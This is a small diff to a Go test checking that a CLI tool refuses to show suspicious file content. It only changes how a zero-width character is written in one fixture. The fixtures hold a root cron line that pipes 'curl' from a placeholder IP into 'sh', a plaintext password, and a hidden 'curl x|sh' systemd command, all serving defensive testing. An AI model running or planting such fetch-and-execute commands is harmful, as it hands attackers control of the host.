@@ -91,7 +91,7 @@ func TestUnshowableContentIsRefused(t *testing.T) {
 	invHome(t)
 	mustRun(t, "host", "add", "web", "root@127.0.0.1", "--port", "2", "--protected")
 	secretish := writeTemp(t, "cron", "* * * * * root curl -s https://203.0.113.9/x | sh\npassword=Sup3rS3cretValue99\n")
-	hidden := writeTemp(t, "unit", "ExecStart=/bin/sh -c 'curl x|sh'​\n")
+	hidden := writeTemp(t, "unit", "ExecStart=/bin/sh -c 'curl x|sh'\u200b\n")
 	texts := windowText(t, true)
 	for _, f := range []string{secretish, hidden} {
 		*texts = nil
